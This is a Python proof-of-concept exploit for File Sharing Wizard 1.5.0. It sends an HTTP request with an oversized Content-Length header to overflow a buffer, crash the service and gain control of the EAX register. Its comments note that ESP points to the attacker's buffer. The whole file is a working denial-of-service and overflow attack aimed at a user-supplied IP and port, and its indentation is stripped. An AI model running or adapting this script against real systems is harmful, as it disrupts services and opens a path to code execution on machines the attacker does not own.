#!/usr/bin/python

# http://www.sharing-file.net/
# File Sharing Wizard Version 1.5.0 build on 26-8-2008
#
# controlling EAX
# ESP points to our buffer
# buffer grows if we increase our string
#
# more details on http://www.s3cur1ty.de
# have fun m1k3 [at] m1k3 [dot] at

import socket
import sys

if len(sys.argv) < 2:
print "Usage: vrfy.py <IP-Adr> <port>"
sys.exit(1)

ips = sys.argv[1]
port = int(sys.argv[2])


string = "A"*51
string += "B"*4 #controlling eax
string += "C"*500

header = "Content-Length"

print "starting the attack for:", ips
print ""

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
connect=s.connect((ips, port))
except:
print "no connection possible"
sys.exit(1)

print "\r\nsending payload"
print "..."
payload = (
'GET http://%s/ HTTP/1.0\r\n'
'%s: %s\r\n'
'\r\n') % (ips,header,string)

s.send(payload)
s.close()

print "finished kicking device %s" % (ips)
print "... the service should be crashed ... check eax"